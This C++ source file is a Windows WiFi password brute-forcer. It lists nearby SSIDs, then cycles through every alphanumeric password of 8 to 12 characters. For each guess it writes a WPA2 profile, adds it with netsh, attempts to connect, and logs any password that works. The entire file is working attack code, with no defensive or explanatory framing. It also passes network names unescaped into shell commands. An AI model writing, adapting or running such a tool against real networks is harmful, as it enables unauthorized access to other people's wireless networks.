#include <iostream>
#include <vector>
#include <string>
#include <cstdlib>
#include <sstream>
#include <algorithm>
#include <array>
#include <stdexcept>
#include <fstream>
#include <ctime>
#include <thread>
#include <chrono>

// Trim leading and trailing whitespace
std::string trim(const std::string& s) {
    auto start = s.find_first_not_of(" \t\r\n");
    auto end = s.find_last_not_of(" \t\r\n");
    return (start == std::string::npos) ? "" : s.substr(start, end - start + 1);
}

// Function to execute a system command and capture its output
std::string executeCommand(const std::string& command) {
    std::array<char, 128> buffer;
    std::string result;
    FILE* pipe = popen(command.c_str(), "r");
    if (!pipe) throw std::runtime_error("popen() failed!");
    try {
        while (fgets(buffer.data(), buffer.size(), pipe) != nullptr) {
            result += buffer.data();
        }
    } catch (...) {
        pclose(pipe);
        throw;
    }
    pclose(pipe);
    return result;
}

// Function to parse SSIDs from the command output
std::vector<std::string> parseSSIDs(const std::string& output) {
    std::vector<std::string> ssids;
    std::istringstream stream(output);
    std::string line;
    while (std::getline(stream, line)) {
        if (line.find("SSID") != std::string::npos && line.find("BSSID") == std::string::npos) {
            auto pos = line.find(":");
            if (pos != std::string::npos) {
                std::string ssid = trim(line.substr(pos + 1));
                if (!ssid.empty() && std::find(ssids.begin(), ssids.end(), ssid) == ssids.end()) {
                    ssids.push_back(ssid);
                }
            }
        }
    }
    return ssids;
}

// Updated guessPassword function to attempt connection for each guess
void guessPassword(const std::string& ssid, const std::string& characters, int minLength, int maxLength) {
    std::ofstream outFile("found_string.txt");
    if (!outFile.is_open()) {
        std::cerr << "Failed to open output file." << std::endl;
        return;
    }

    size_t attempts = 0;
    std::string command;
    std::vector<char> guess;
    for (int length = minLength; length <= maxLength; ++length) {
        guess.assign(length, characters[0]);
        while (true) {
            // Construct the guessed password
            std::string guessedPassword(guess.begin(), guess.end());
            ++attempts;
            std::cout << "Attempt " << attempts << ": " << guessedPassword << std::endl;

            // Create a temporary WiFi profile with the guessed password
            std::string profileXML = "<?xml version=\"1.0\"?>\n"
                                      "<WLANProfile xmlns=\"http://www.microsoft.com/networking/WLAN/profile/v1\">\n"
                                      "    <name>" + ssid + "</name>\n"
                                      "    <SSIDConfig>\n"
                                      "        <SSID>\n"
                                      "            <name>" + ssid + "</name>\n"
                                      "        </SSID>\n"
                                      "    </SSIDConfig>\n"
                                      "    <connectionType>ESS</connectionType>\n"
                                      "    <connectionMode>auto</connectionMode>\n"
                                      "    <MSM>\n"
                                      "        <security>\n"
                                      "            <authEncryption>\n"
                                      "                <authentication>WPA2PSK</authentication>\n"
                                      "                <encryption>AES</encryption>\n"
                                      "                <useOneX>false</useOneX>\n"
                                      "            </authEncryption>\n"
                                      "            <sharedKey>\n"
                                      "                <keyType>passPhrase</keyType>\n"
                                      "                <protected>false</protected>\n"
                                      "                <keyMaterial>" + guessedPassword + "</keyMaterial>\n"
                                      "            </sharedKey>\n"
                                      "        </security>\n"
                                      "    </MSM>\n"
                                      "</WLANProfile>";

            // Save the profile to a temporary file
            std::ofstream profileFile("wifi_profile.xml");
            if (!profileFile.is_open()) {
                std::cerr << "Failed to create WiFi profile file." << std::endl;
                return;
            }
            profileFile << profileXML;
            profileFile.close();

            // Add the profile to the system
            command = "netsh wlan add profile filename=wifi_profile.xml user=all";
            executeCommand(command);

            // Attempt to connect to the WiFi network
            command = "netsh wlan connect name=\"" + ssid + "\"";
            std::string output = executeCommand(command);

            // Check connection status
            std::string statusOutput = executeCommand("netsh wlan show interfaces");
            if (statusOutput.find(ssid) != std::string::npos && statusOutput.find("connected") != std::string::npos) {
                std::cout << "Password found: " << guessedPassword << std::endl;
                outFile << "Found password: " << guessedPassword << "\nAttempts: " << attempts << std::endl;
                return;
            }

            // Add a delay between attempts to avoid overwhelming the system
            std::this_thread::sleep_for(std::chrono::milliseconds(500));

            // Generate the next permutation
            int i = length - 1;
            while (i >= 0 && guess[i] == characters.back()) {
                guess[i] = characters[0];
                --i;
            }
            if (i < 0) break;
            guess[i] = characters[characters.find(guess[i]) + 1];
        }
    }

    std::cout << "Failed to guess the password." << std::endl;
    outFile << "Failed to guess the password." << std::endl;
}

int main() {
    try {
        std::cout << "Scanning for available SSIDs..." << std::endl;
        std::string commandOutput = executeCommand("netsh wlan show network");
        std::vector<std::string> ssids = parseSSIDs(commandOutput);

        if (ssids.empty()) {
            std::cout << "No SSIDs found." << std::endl;
            return 0;
        }

        std::cout << "\nAvailable SSIDs:\n";
        for (size_t i = 0; i < ssids.size(); ++i) {
            std::cout << i + 1 << ". " << ssids[i] << std::endl;
        }

        int choice = 0;
        std::cout << "\nSelect the SSID by number: ";
        std::cin >> choice;

        if (std::cin.fail() || choice < 1 || choice > static_cast<int>(ssids.size())) {
            std::cerr << "Invalid selection." << std::endl;
            return 1;
        }

        std::string selectedSSID = ssids[choice - 1];
        std::cout << "You selected: " << selectedSSID << std::endl;

        // Define the character set and password length range
        std::string characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        int minLength = 8;
        int maxLength = 12;

        // Attempt to guess the password
        guessPassword(selectedSSID, characters, minLength, maxLength);

    } catch (const std::exception& e) {
        std::cerr << "Error: " << e.what() << std::endl;
    }

    return 0;
}
